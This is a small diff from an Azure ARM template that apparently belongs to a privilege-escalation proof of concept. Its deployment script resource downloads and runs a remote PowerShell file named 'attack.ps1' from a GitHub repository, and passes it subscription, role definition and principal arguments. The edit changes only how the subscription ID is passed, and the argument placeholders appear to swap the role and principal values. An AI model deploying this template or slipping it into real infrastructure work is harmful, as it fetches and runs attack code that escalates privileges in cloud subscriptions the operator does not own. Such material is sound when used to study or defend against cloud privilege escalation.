@@ -36,7 +36,7 @@
             "properties": {
                 "forceUpdateTag": "[parameters('guid')]",
                 "azPowerShellVersion": "5.4",
-                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', subscription().id, parameters('principalId'), parameters('roleDefinitionId'))]",
+                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', subscription().subscriptionId, parameters('principalId'), parameters('roleDefinitionId'))]",
                 "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/attack.ps1",
                 "supportingScriptUris": [],
                 "timeout": "PT30M",
